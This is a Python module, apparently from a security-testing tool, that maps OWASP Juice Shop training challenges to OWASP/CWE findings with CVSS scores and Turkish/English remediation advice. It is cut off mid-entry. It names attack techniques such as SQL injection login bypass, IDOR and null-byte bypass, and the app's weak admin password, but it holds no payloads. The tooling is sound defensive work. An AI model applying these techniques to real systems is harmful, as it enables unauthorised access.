"""Client and challenge map for OWASP Juice Shop (the *security* target).

Juice Shop is a well-known, deliberately vulnerable web app. We attack a small, reliable
set of its training **challenges**, then confirm each one via its own API
(``GET /api/Challenges``, field ``solved``). A solved challenge is proof the vulnerability
is real, so we turn it into a :class:`~secureqa.findings.Finding`.
(TR: Juice Shop'un eğitim "challenge"larını çözüp /api/Challenges ile doğrularız;
çözülen her challenge bir güvenlik bulgusuna dönüşür.)

We only use documented, non-destructive training exploits against a *local* instance.
"""

from __future__ import annotations

import time
from dataclasses import dataclass
from urllib.parse import quote

import requests

from secureqa.findings import Finding


@dataclass(frozen=True)
class ChallengeInfo:
    """How one Juice Shop challenge maps to an OWASP/CWE finding (TR: challenge -> bulgu)."""

    key: str                 # stable Juice Shop challenge key, e.g. "loginAdminChallenge"
    name: str                # human name shown on the score board
    title_tr: str
    title_en: str
    severity: str
    owasp: str
    cwe: str
    remediation_tr: str
    remediation_en: str
    # CVSS 3.1 base score + vector. We assign standard values per vulnerability class rather
    # than inventing numbers: SQLi auth-bypass to full admin = 9.8 (C:H/I:H/A:H), SQLi login
    # as a single user / credential or security-question account takeover = 9.1 (C:H/I:H/A:N),
    # confidential-file or credential/log disclosure = 7.5 (C:H only), DOM/reflected XSS = 6.1
    # (S:C, UI:R, C:L/I:L), IDOR/data-tampering needing a session = 6.5 (PR:L, I:H), an
    # info/verbose-error/hidden-endpoint leak = 5.3 (C:L), and purely informational discoveries
    # (privacy/security policy pages) = 0.0 (C:N/I:N/A:N). The score is derived from the vector.
    # (TR: Her zafiyet sınıfı için standart CVSS 3.1 taban puanı ve vektörü.)
    cvss: float = 0.0
    cvss_vector: str = ""

    def finding(self, base_url: str, evidence: str, test_id: str = "") -> Finding:
        """Build a :class:`Finding` for this solved challenge."""
        return Finding(
            id=f"JS-{self.key}",
            title_tr=self.title_tr,
            title_en=self.title_en,
            severity=self.severity,
            owasp=self.owasp,
            cwe=self.cwe,
            url=f"{base_url}/#/score-board",
            evidence=evidence,
            remediation_tr=self.remediation_tr,
            remediation_en=self.remediation_en,
            cvss=self.cvss,
            cvss_vector=self.cvss_vector,
            description_tr=f"Juice Shop challenge '{self.name}' çözüldü — zafiyet doğrulandı.",
            description_en=f"Juice Shop challenge '{self.name}' was solved — the vulnerability is confirmed.",
            test_id=test_id,
        )


# The challenges we attack. Keys come from Juice Shop's data/static/challenges.yml and are
# stable across versions. (TR: Saldırdığımız challenge'lar — anahtarlar sürümler arası sabit.)
CHALLENGES: dict[str, ChallengeInfo] = {
    "loginAdminChallenge": ChallengeInfo(
        key="loginAdminChallenge",
        name="Login Admin",
        title_tr="SQL Enjeksiyonu ile Yönetici Girişi (Juice Shop)",
        title_en="SQL Injection Admin Login (Juice Shop)",
        severity="critical",
        owasp="A03:2021-Injection",
        cwe="CWE-89",
        remediation_tr="Giriş sorgularını parametreli yapın; girdiyi asla SQL metnine birleştirmeyin.",
        remediation_en="Use parameterized login queries; never concatenate input into SQL text.",
        cvss=9.8,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    ),
    "localXssChallenge": ChallengeInfo(
        key="localXssChallenge",
        name="DOM XSS",
        title_tr="DOM Tabanlı XSS (Juice Shop arama)",
        title_en="DOM-based XSS (Juice Shop search)",
        severity="high",
        owasp="A03:2021-Injection",
        cwe="CWE-79",
        remediation_tr="Kullanıcı girdisini DOM'a yazarken güvenli API'ler (textContent) ve çıktı kodlaması kullanın.",
        remediation_en="Use safe DOM APIs (textContent) and output encoding when writing user input to the DOM.",
        cvss=6.1,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
    ),
    "directoryListingChallenge": ChallengeInfo(
        key="directoryListingChallenge",
        name="Confidential Document",
        title_tr="Gizli Belgeye Erişim (Juice Shop /ftp)",
        title_en="Confidential Document Access (Juice Shop /ftp)",
        severity="high",
        owasp="A02:2021-Cryptographic Failures",
        cwe="CWE-200",
        remediation_tr="Gizli dosyaları web kökünün dışında tutun ve erişimi yetkiyle sınırlayın.",
        remediation_en="Keep confidential files outside the web root and restrict access with authorization.",
        cvss=7.5,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    ),
    "errorHandlingChallenge": ChallengeInfo(
        key="errorHandlingChallenge",
        name="Error Handling",
        title_tr="Ayrıntılı Hata Mesajı İfşası (Juice Shop)",
        title_en="Verbose Error Disclosure (Juice Shop)",
        severity="medium",
        owasp="A05:2021-Security Misconfiguration",
        cwe="CWE-209",
        remediation_tr="Kullanıcıya genel hata sayfası gösterin; ayrıntıları yalnızca sunucu loguna yazın.",
        remediation_en="Show a generic error page; write details only to the server log.",
        cvss=5.3,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    ),
    "exposedMetricsChallenge": ChallengeInfo(
        key="exposedMetricsChallenge",
        name="Exposed Metrics",
        title_tr="Açıkta Bırakılan Metrik Ucu (Juice Shop /metrics)",
        title_en="Exposed Metrics Endpoint (Juice Shop /metrics)",
        severity="low",
        owasp="A05:2021-Security Misconfiguration",
        cwe="CWE-200",
        remediation_tr="İzleme uçlarını (/metrics) kimlik doğrulama ile koruyun veya dışarıya kapatın.",
        remediation_en="Protect monitoring endpoints (/metrics) with authentication or do not expose them.",
        cvss=5.3,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    ),
    "adminSectionChallenge": ChallengeInfo(
        key="adminSectionChallenge",
        name="Admin Section",
        title_tr="Yönetici Bölümüne Erişim (Juice Shop)",
        title_en="Admin Section Access (Juice Shop)",
        severity="high",
        owasp="A01:2021-Broken Access Control",
        cwe="CWE-284",
        remediation_tr="Yönetici rotalarını sunucu tarafında rol kontrolüyle koruyun (sadece istemci gizleme yetmez).",
        remediation_en="Protect admin routes with server-side role checks (hiding them on the client is not enough).",
        cvss=7.1,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N",
    ),
    # ---------------------------------------------------------------- A03 Injection (more)
    "loginBenderChallenge": ChallengeInfo(
        key="loginBenderChallenge",
        name="Login Bender",
        title_tr="SQL Enjeksiyonu ile Bender Hesabına Giriş (Juice Shop)",
        title_en="SQL Injection Login as Bender (Juice Shop)",
        severity="critical",
        owasp="A03:2021-Injection",
        cwe="CWE-89",
        remediation_tr="Giriş sorgularını parametreli hazırlayın; e-postayı SQL metnine birleştirmeyin.",
        remediation_en="Use parameterized login queries; do not concatenate the e-mail into SQL text.",
        cvss=9.1,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
    ),
    "loginJimChallenge": ChallengeInfo(
        key="loginJimChallenge",
        name="Login Jim",
        title_tr="SQL Enjeksiyonu ile Jim Hesabına Giriş (Juice Shop)",
        title_en="SQL Injection Login as Jim (Juice Shop)",
        severity="high",
        owasp="A03:2021-Injection",
        cwe="CWE-89",
        remediation_tr="Giriş sorgularını parametreli hazırlayın; girdiyi doğrulayın.",
        remediation_en="Use parameterized login queries and validate input.",
        cvss=9.1,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
    ),
    "unionSqlInjectionChallenge": ChallengeInfo(
        key="unionSqlInjectionChallenge",
        name="User Credentials",
        title_tr="UNION SQL Enjeksiyonu ile Kullanıcı Kimlik Bilgileri (Juice Shop)",
        title_en="User Credentials via UNION SQL Injection (Juice Shop)",
        severity="critical",
        owasp="A03:2021-Injection",
        cwe="CWE-89",
        remediation_tr="Parametreli sorgular kullanın; ürün aramasını kullanıcı tablosundan yalıtın.",
        remediation_en="Use parameterized queries; isolate product search from the user table.",
        cvss=7.5,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    ),
    "dbSchemaChallenge": ChallengeInfo(
        key="dbSchemaChallenge",
        name="Database Schema",
        title_tr="UNION SQL Enjeksiyonu ile Veritabanı Şeması İfşası (Juice Shop)",
        title_en="Database Schema Disclosure via UNION SQL Injection (Juice Shop)",
        severity="high",
        owasp="A03:2021-Injection",
        cwe="CWE-89",
        remediation_tr="Parametreli sorgular kullanın; hata ve sonuçlarda şema bilgisini sızdırmayın.",
        remediation_en="Use parameterized queries; never let results or errors leak the schema.",
        cvss=7.5,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    ),
    "reflectedXssChallenge": ChallengeInfo(
        key="reflectedXssChallenge",
        name="Reflected XSS",
        title_tr="Yansıtılmış XSS (Juice Shop sipariş takibi)",
        title_en="Reflected XSS (Juice Shop order tracking)",
        severity="high",
        owasp="A03:2021-Injection",
        cwe="CWE-79",
        remediation_tr="Yansıtılan parametreleri çıktı kodlamasıyla temizleyin; HTML bağlamına ham yazmayın.",
        remediation_en="Output-encode reflected parameters; never write them raw into an HTML context.",
        cvss=6.1,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
    ),
    "xssBonusChallenge": ChallengeInfo(
        key="xssBonusChallenge",
        name="Bonus Payload",
        title_tr="DOM XSS Bonus Yükü (Juice Shop arama)",
        title_en="DOM XSS Bonus Payload (Juice Shop search)",
        severity="high",
        owasp="A03:2021-Injection",
        cwe="CWE-79",
        remediation_tr="Girdiyi güvenli olarak işaretlemeyin (bypassSecurityTrustHtml); çıktı kodlaması kullanın.",
        remediation_en="Do not mark input as trusted (bypassSecurityTrustHtml); rely on output encoding.",
        cvss=6.1,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
    ),
    # ---------------------------------------------------------------- A01 Broken Access Control (more)
    "basketAccessChallenge": ChallengeInfo(
        key="basketAccessChallenge",
        name="View Basket",
        title_tr="Başka Kullanıcının Sepetine Erişim - IDOR (Juice Shop)",
        title_en="Access Another User's Basket - IDOR (Juice Shop)",
        severity="high",
        owasp="A01:2021-Broken Access Control",
        cwe="CWE-639",
        remediation_tr="Sepet uçlarında nesne sahipliğini sunucu tarafında doğrulayın (oturumdaki kullanıcı).",
        remediation_en="Enforce object ownership server-side on basket endpoints (the session user).",
        cvss=6.5,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    ),
    "redirectCryptoCurrencyChallenge": ChallengeInfo(
        key="redirectCryptoCurrencyChallenge",
        name="Outdated Allowlist",
        title_tr="Doğrulanmamış Yönlendirme - Açık Yönlendirme (Juice Shop)",
        title_en="Unvalidated Redirect - Open Redirect (Juice Shop)",
        severity="medium",
        owasp="A01:2021-Broken Access Control",
        cwe="CWE-601",
        remediation_tr="Yönlendirme hedeflerini sıkı bir izin listesiyle sınırlayın ve listeyi güncel tutun.",
        remediation_en="Restrict redirect targets with a strict allowlist and keep the list current.",
        cvss=4.7,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N",
    ),
    "registerAdminChallenge": ChallengeInfo(
        key="registerAdminChallenge",
        name="Admin Registration",
        title_tr="Kayıt Sırasında Yetki Yükseltme - Admin Kaydı (Juice Shop)",
        title_en="Privilege Escalation at Registration - Admin Registration (Juice Shop)",
        severity="high",
        owasp="A01:2021-Broken Access Control",
        cwe="CWE-269",
        remediation_tr="İstemciden gelen 'role' alanını yok sayın; rolü yalnızca sunucu belirlesin.",
        remediation_en="Ignore any client-supplied 'role' field; assign roles only on the server.",
        cvss=9.1,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
    ),
    "forgedFeedbackChallenge": ChallengeInfo(
        key="forgedFeedbackChallenge",
        name="Forged Feedback",
        title_tr="Başka Kullanıcı Adına Geri Bildirim (Juice Shop)",
        title_en="Forged Feedback on Behalf of Another User (Juice Shop)",
        severity="medium",
        owasp="A01:2021-Broken Access Control",
        cwe="CWE-639",
        remediation_tr="İstemciden gelen UserId'yi reddedin; sahibi oturumdaki kullanıcıdan alın.",
        remediation_en="Reject a client-supplied UserId; derive the owner from the session user.",
        cvss=4.3,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
    ),
    "feedbackChallenge": ChallengeInfo(
        key="feedbackChallenge",
        name="Five-Star Feedback",
        title_tr="Başka Kullanıcının Geri Bildirimini Silme - IDOR (Juice Shop)",
        title_en="Delete Another User's Feedback - IDOR (Juice Shop)",
        severity="medium",
        owasp="A01:2021-Broken Access Control",
        cwe="CWE-639",
        remediation_tr="Silme işleminden önce kaydın sahibini yetkilendirin; yalnızca kimliği doğrulanmış olması yetmez.",
        remediation_en="Authorize the record owner before deletion; being authenticated alone is not enough.",
        cvss=6.5,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
    ),
    # ---------------------------------------------------------------- A05 Security Misconfiguration (more)
    "scoreBoardChallenge": ChallengeInfo(
        key="scoreBoardChallenge",
        name="Score Board",
        title_tr="Gizli Skor Tablosunun Keşfi (Juice Shop)",
        title_en="Hidden Score Board Discovery (Juice Shop)",
        severity="low",
        owasp="A05:2021-Security Misconfiguration",
        cwe="CWE-200",
        remediation_tr="Gizlilikle güvenliğe güvenmeyin; yönetim sayfalarını yetkiyle koruyun.",
        remediation_en="Do not rely on security through obscurity; protect management pages with authorization.",
        cvss=5.3,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    ),
    "privacyPolicyChallenge": ChallengeInfo(
        key="privacyPolicyChallenge",
        name="Privacy Policy",
        title_tr="Gizlilik Politikası Sayfasına Doğrudan Erişim (Juice Shop)",
        title_en="Direct Access to the Privacy Policy Page (Juice Shop)",
        severity="info",
        owasp="A05:2021-Security Misconfiguration",
        cwe="CWE-200",
        remediation_tr="Bilgi amaçlı; yönlendirme kaynaklı sayfa keşfini bilinçli tasarlayın.",
        remediation_en="Informational; design page discovery via navigation deliberately.",
        cvss=0.0,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",
    ),
    "securityPolicyChallenge": ChallengeInfo(
        key="securityPolicyChallenge",
        name="Security Policy",
        title_tr="security.txt Güvenlik Politikası Dosyası (Juice Shop)",
        title_en="security.txt Security Policy File (Juice Shop)",
        severity="info",
        owasp="A05:2021-Security Misconfiguration",
        cwe="CWE-200",
        remediation_tr="security.txt sağlamak iyi uygulamadır; iletişim ve açıklama politikasını güncel tutun.",
        remediation_en="Providing security.txt is good practice; keep the contact and disclosure policy current.",
        cvss=0.0,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",
    ),
    # ---------------------------------------------------------------- A04 Insecure Design
    "emptyUserRegistration": ChallengeInfo(
        key="emptyUserRegistration",
        name="Empty User Registration",
        title_tr="Boş Kullanıcı Kaydı - İstemci Doğrulamasını Atlama (Juice Shop)",
        title_en="Empty User Registration - Bypassing Client Validation (Juice Shop)",
        severity="low",
        owasp="A04:2021-Insecure Design",
        cwe="CWE-20",
        remediation_tr="Doğrulamayı sunucuda da zorunlu kılın; boş e-posta/parolayı reddedin.",
        remediation_en="Enforce validation on the server too; reject empty e-mail/password.",
        cvss=5.3,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
    ),
    "passwordRepeatChallenge": ChallengeInfo(
        key="passwordRepeatChallenge",
        name="Repetitive Registration",
        title_tr="Parola Tekrarı Doğrulaması Yok (Juice Shop kaydı)",
        title_en="Missing Password-Repeat Validation (Juice Shop registration)",
        severity="low",
        owasp="A04:2021-Insecure Design",
        cwe="CWE-20",
        remediation_tr="Parola ve tekrarının eşleştiğini sunucu tarafında doğrulayın.",
        remediation_en="Validate on the server that the password and its repeat match.",
        cvss=5.3,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
    ),
    "zeroStarsChallenge": ChallengeInfo(
        key="zeroStarsChallenge",
        name="Zero Stars",
        title_tr="Sıfır Yıldızlı Geri Bildirim - İstemci Doğrulamasını Atlama (Juice Shop)",
        title_en="Zero-Star Feedback - Bypassing Client Validation (Juice Shop)",
        severity="low",
        owasp="A04:2021-Insecure Design",
        cwe="CWE-20",
        remediation_tr="Puan aralığını (1-5) sunucuda zorunlu kılın; istemci kontrolüne güvenmeyin.",
        remediation_en="Enforce the rating range (1-5) on the server; do not trust the client control.",
        cvss=5.3,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
    ),
    # ---------------------------------------------------------------- A02 Cryptographic Failures (more)
    "weirdCryptoChallenge": ChallengeInfo(
        key="weirdCryptoChallenge",
        name="Weird Crypto",
        title_tr="Uygunsuz Kriptografi Kullanımı (Juice Shop - md5/base64)",
        title_en="Inappropriate Cryptography Usage (Juice Shop - md5/base64)",
        severity="medium",
        owasp="A02:2021-Cryptographic Failures",
        cwe="CWE-327",
        remediation_tr="Parola saklamada md5/base64 kullanmayın; bcrypt/argon2 gibi güçlü algoritmalar seçin.",
        remediation_en="Do not use md5/base64 for passwords; choose strong algorithms such as bcrypt/argon2.",
        cvss=5.9,
        cvss_vector="CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
    ),
    # ---------------------------------------------------------------- A07 Authentication Failures
    "weakPasswordChallenge": ChallengeInfo(
        key="weakPasswordChallenge",
        name="Password Strength",
        title_tr="Zayıf Yönetici Parolası (Juice Shop - admin123)",
        title_en="Weak Administrator Password (Juice Shop - admin123)",
        severity="high",
        owasp="A07:2021-Identification and Authentication Failures",
        cwe="CWE-521",
        remediation_tr="Güçlü parola politikası uygulayın; varsayılan/zayıf parolaları yasaklayın.",
        remediation_en="Enforce a strong password policy; forbid default/weak passwords.",
        cvss=9.8,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    ),
    # ================================================================ v2 expansion (15+ more)
    # ---------------------------------------------------------------- A07 Authentication Failures (more)
    "loginSupportChallenge": ChallengeInfo(
        key="loginSupportChallenge",
        name="Login Support Team",
        title_tr="Sızdırılmış Kimlik Bilgileriyle Destek Ekibi Girişi (Juice Shop)",
        title_en="Login as Support Team with Leaked Credentials (Juice Shop)",
        severity="high",
        owasp="A07:2021-Identification and Authentication Failures",
        cwe="CWE-798",
        remediation_tr="Gömülü/sızdırılmış kimlik bilgilerini iptal edin; sırları kod ve imajlardan uzak tutun, çok faktörlü kimlik doğrulama ekleyin.",
        remediation_en="Revoke embedded/leaked credentials; keep secrets out of code and images and add multi-factor authentication.",
        cvss=9.1,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
    ),
    "loginRapperChallenge": ChallengeInfo(
        key="loginRapperChallenge",
        name="Login MC SafeSearch",
        title_tr="Tahmin Edilebilir Parolayla MC SafeSearch Girişi (Juice Shop)",
        title_en="Login as MC SafeSearch with a Guessable Password (Juice Shop)",
        severity="high",
        owasp="A07:2021-Identification and Authentication Failures",
        cwe="CWE-521",
        remediation_tr="Güçlü, tahmin edilemez parolalar zorunlu kılın; kişisel/kamuya açık bilgilerden türeyen parolaları engelleyin.",
        remediation_en="Require strong, unguessable passwords; block passwords derived from personal/public information.",
        cvss=9.1,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
    ),
    "loginAmyChallenge": ChallengeInfo(
        key="loginAmyChallenge",
        name="Login Amy",
        title_tr="Zayıf Parolayla Amy Hesabına Giriş (Juice Shop)",
        title_en="Login as Amy with a Weak Password (Juice Shop)",
        severity="high",
        owasp="A07:2021-Identification and Authentication Failures",
        cwe="CWE-521",
        remediation_tr="Minimum entropi ve uzunluk kuralları uygulayın; bilinen zayıf kalıpları reddedin.",
        remediation_en="Enforce minimum entropy and length rules; reject known weak patterns.",
        cvss=9.1,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
    ),
    "exposedCredentialsChallenge": ChallengeInfo(
        key="exposedCredentialsChallenge",
        name="Exposed Credentials",
        title_tr="İstemci Kodunda Açıkta Bırakılmış Kimlik Bilgileri (Juice Shop)",
        title_en="Hard-coded Credentials Exposed in Client Code (Juice Shop)",
        severity="high",
        owasp="A07:2021-Identification and Authentication Failures",
        cwe="CWE-798",
        remediation_tr="Kaynak koda/istemciye kimlik bilgisi gömmeyin; test hesaplarını üretimde devre dışı bırakın.",
        remediation_en="Never hard-code credentials in source/client code; disable test accounts in production.",
        cvss=9.1,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
    ),
    "resetPasswordJimChallenge": ChallengeInfo(
        key="resetPasswordJimChallenge",
        name="Reset Jim's Password",
        title_tr="Zayıf Güvenlik Sorusuyla Jim'in Parolasını Sıfırlama (Juice Shop)",
        title_en="Reset Jim's Password via a Weak Security Question (Juice Shop)",
        severity="high",
        owasp="A07:2021-Identification and Authentication Failures",
        cwe="CWE-640",
        remediation_tr="Tahmin edilebilir/kamuya açık yanıtlı güvenlik sorularını kullanmayın; sıfırlamayı zaman sınırlı token ve ikinci faktörle koruyun.",
        remediation_en="Do not use security questions with guessable/public answers; protect reset with time-limited tokens and a second factor.",
        cvss=9.1,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
    ),
    # ---------------------------------------------------------------- A02 Cryptographic Failures / Sensitive Data (more)
    "retrieveBlueprintChallenge": ChallengeInfo(
        key="retrieveBlueprintChallenge",
        name="Retrieve Blueprint",
        title_tr="Gizli Ürün Planının (Blueprint) İfşası (Juice Shop)",
        title_en="Disclosure of the Confidential Product Blueprint (Juice Shop)",
        severity="high",
        owasp="A02:2021-Cryptographic Failures",
        cwe="CWE-200",
        remediation_tr="Fikri mülkiyet dosyalarını herkese açık statik dizinlerde tutmayın; erişimi yetkilendirin.",
        remediation_en="Do not keep intellectual-property files in public static folders; authorize access.",
        cvss=7.5,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    ),
    "forgottenDevBackupChallenge": ChallengeInfo(
        key="forgottenDevBackupChallenge",
        name="Forgotten Developer Backup",
        title_tr="Unutulmuş Geliştirici Yedeğine Erişim (Juice Shop /ftp)",
        title_en="Access to a Forgotten Developer Backup (Juice Shop /ftp)",
        severity="high",
        owasp="A05:2021-Security Misconfiguration",
        cwe="CWE-530",
        remediation_tr="Yedek dosyalarını web kökünden kaldırın; dağıtıma yalnızca gerekli dosyaları dahil edin.",
        remediation_en="Remove backup files from the web root; ship only the files the deployment needs.",
        cvss=7.5,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    ),
    "forgottenBackupChallenge": ChallengeInfo(
        key="forgottenBackupChallenge",
        name="Forgotten Sales Backup",
        title_tr="Unutulmuş Satış Yedeğine Erişim (Juice Shop /ftp)",
        title_en="Access to a Forgotten Sales Backup (Juice Shop /ftp)",
        severity="high",
        owasp="A05:2021-Security Misconfiguration",
        cwe="CWE-530",
        remediation_tr="Hassas yedekleri kamuya açık dizinlerde saklamayın; erişim denetimi ve saklama politikası uygulayın.",
        remediation_en="Do not store sensitive backups in public folders; apply access control and a retention policy.",
        cvss=7.5,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    ),
    # ---------------------------------------------------------------- A03 Injection / Improper Input (more)
    "nullByteChallenge": ChallengeInfo(
        key="nullByteChallenge",
        name="Poison Null Byte",
        title_tr="Zehirli Null Byte ile Dosya Türü Kısıtlamasını Atlama (Juice Shop)",
        title_en="Poison Null Byte Bypass of File-Type Restriction (Juice Shop)",
        severity="high",
        owasp="A03:2021-Injection",
        cwe="CWE-158",
        remediation_tr="Dosya adlarındaki null byte'ları ve path geçişini sunucu tarafında temizleyin; izin verilen türleri gerçek içeriğe göre doğrulayın.",
        remediation_en="Strip null bytes and path traversal from file names server-side; validate allowed types against real content.",
        cvss=7.5,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    ),
    "christmasSpecialChallenge": ChallengeInfo(
        key="christmasSpecialChallenge",
        name="Christmas Special",
        title_tr="SQL Enjeksiyonu ile Silinmiş Ürünü Sipariş Etme (Juice Shop)",
        title_en="Ordering a Logically-Deleted Product via SQL Injection (Juice Shop)",
        severity="low",
        owasp="A03:2021-Injection",
        cwe="CWE-89",
        remediation_tr="Aramayı parametreli yapın; silinmiş ürünlerin sepete eklenmesini ve sipariş edilmesini sunucuda engelleyin.",
        remediation_en="Parameterize search; block adding and ordering logically-deleted products server-side.",
        cvss=5.3,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
    ),
    # ---------------------------------------------------------------- A01 Broken Access Control (more)
    "basketManipulateChallenge": ChallengeInfo(
        key="basketManipulateChallenge",
        name="Manipulate Basket",
        title_tr="Başka Kullanıcının Sepetine Ürün Ekleme - Toplu Atama (Juice Shop)",
        title_en="Add Items to Another User's Basket - Mass Assignment (Juice Shop)",
        severity="high",
        owasp="A01:2021-Broken Access Control",
        cwe="CWE-639",
        remediation_tr="İstemciden gelen BasketId'yi yok sayın; sepeti oturumdaki kullanıcıdan türetin.",
        remediation_en="Ignore any client-supplied BasketId; derive the basket from the session user.",
        cvss=6.5,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
    ),
    "changeProductChallenge": ChallengeInfo(
        key="changeProductChallenge",
        name="Product Tampering",
        title_tr="Yetkisiz Ürün Değişikliği - Ürün Kurcalama (Juice Shop)",
        title_en="Unauthorized Product Modification - Product Tampering (Juice Shop)",
        severity="high",
        owasp="A01:2021-Broken Access Control",
        cwe="CWE-284",
        remediation_tr="Ürün güncelleme uçlarını sunucu tarafında rol kontrolüyle koruyun; yazma işlemlerini yalnızca yetkili rollere açın.",
        remediation_en="Protect product update endpoints with server-side role checks; allow writes only for authorized roles.",
        cvss=7.5,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
    ),
    # ---------------------------------------------------------------- A04 Insecure Design (more)
    "negativeOrderChallenge": ChallengeInfo(
        key="negativeOrderChallenge",
        name="Payback Time",
        title_tr="Negatif Miktarla Negatif Tutarlı Sipariş (Juice Shop)",
        title_en="Negative-Total Order via Negative Quantity (Juice Shop)",
        severity="high",
        owasp="A04:2021-Insecure Design",
        cwe="CWE-840",
        remediation_tr="Miktar ve tutarı sunucuda doğrulayın; negatif/aşırı değerleri reddedin ve iş kuralı sınırlarını zorunlu kılın.",
        remediation_en="Validate quantity and total on the server; reject negative/excessive values and enforce business-rule limits.",
        cvss=6.5,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
    ),
    "missingEncodingChallenge": ChallengeInfo(
        key="missingEncodingChallenge",
        name="Missing Encoding",
        title_tr="Eksik URL Kodlaması Nedeniyle Erişilemeyen Varlık (Juice Shop)",
        title_en="Asset Unreachable Due to Missing Encoding (Juice Shop)",
        severity="low",
        owasp="A05:2021-Security Misconfiguration",
        cwe="CWE-116",
        remediation_tr="Özel karakterli dosya adlarını doğru şekilde kodlayın/çözün; giriş ve çıkış kodlamasını tutarlı uygulayın.",
        remediation_en="Correctly encode/decode file names with special characters; apply input and output encoding consistently.",
        cvss=5.3,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    ),
    # ---------------------------------------------------------------- A05 Security Misconfiguration (more)
    "tokenSaleChallenge": ChallengeInfo(
        key="tokenSaleChallenge",
        name="Blockchain Hype",
        title_tr="Gizlenmiş Token-Sale Sayfasının Keşfi (Juice Shop)",
        title_en="Discovery of the Hidden Token-Sale Page (Juice Shop)",
        severity="low",
        owasp="A05:2021-Security Misconfiguration",
        cwe="CWE-200",
        remediation_tr="Gizlilikle güvenliğe güvenmeyin; yayına hazır olmayan sayfaları yetkiyle koruyun veya yayınlamayın.",
        remediation_en="Do not rely on obscurity; protect not-yet-public pages with authorization or do not ship them.",
        cvss=5.3,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    ),
    "extraLanguageChallenge": ChallengeInfo(
        key="extraLanguageChallenge",
        name="Extra Language",
        title_tr="Yayınlanmamış Dil Dosyasının Keşfi (Juice Shop)",
        title_en="Discovery of an Unreleased Language File (Juice Shop)",
        severity="low",
        owasp="A05:2021-Security Misconfiguration",
        cwe="CWE-200",
        remediation_tr="Yayınlanmamış/taslak kaynakları üretim dağıtımına dahil etmeyin.",
        remediation_en="Do not include unreleased/draft resources in the production deployment.",
        cvss=5.3,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    ),
    # ---------------------------------------------------------------- A09 Logging & Monitoring Failures
    "accessLogDisclosureChallenge": ChallengeInfo(
        key="accessLogDisclosureChallenge",
        name="Access Log",
        title_tr="Sunucu Erişim Logunun İfşası (Juice Shop /support/logs)",
        title_en="Server Access-Log Disclosure (Juice Shop /support/logs)",
        severity="high",
        owasp="A09:2021-Security Logging and Monitoring Failures",
        cwe="CWE-532",
